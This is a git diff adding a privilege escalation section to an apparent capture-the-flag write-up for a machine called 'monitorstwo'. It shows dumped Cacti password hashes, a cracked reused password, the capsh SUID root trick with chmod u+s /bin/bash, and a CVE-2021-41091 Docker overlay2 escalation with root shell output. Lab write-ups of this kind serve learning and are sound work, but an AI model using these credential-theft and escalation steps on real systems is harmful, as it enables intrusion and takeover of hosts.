@@ -59,7 +59,7 @@ Then I went to connect to the DB with `mysql -h db -u root -proot`. And found cr
 
 Then I was able to get the users credentials from the users_auth table in the cacti schema:
 ```
-admin    | *16514332FCBE9BCB313176EE624C6481BB31BDF3
+admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
 guest    | 43e9a4ab75570f5b
 marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
 ```
@@ -72,3 +72,28 @@ I had to reset the password, which is an md5 to get access. Nothing interesting 
 I don't see any interesting vulnerability in mysql or nginx. At this point I'm guessing that marcus password is also reused as the password of the main host.
 
 Decripted the md5 online and resulted on `funkymonkey`. So trying that for logging though SSH as `marcus`. It goes though and I get to retrieve the user flag.
+
+## Privilege escalation
+
+- No SUID files
+- HAProxy only has a DOS vulnerability
+- No crons
+- No sudo permissions
+- No docker group
+- Docker is version 20.10.5, so it's vulnerable to CVE-2021-41091, but we are not root in any container. At least for now.
+
+Mysql container seems tight in security but we already have some level of access in the cacti one. So let's attempt to do priv esc in that last one.
+
+When checking the SUID files available we see the /sbin/capsh. In [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/) we can see how to exploit it. With `capsh --gid=0 --uid=0 --` we'll turn our shell to root. After gaining access we need to run `chmod u+s /bin/bash`.
+
+Once bash has SUID we can run the exploit for CVE-2021-41091 from the user `marcus` in the host where we already have access. Then we have root access.
+
+```
+marcus@monitorstwo:/tmp$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
+bash-5.1# cd /root/
+bash-5.1# id
+uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
+bash-5.1# whoami
+root
+```
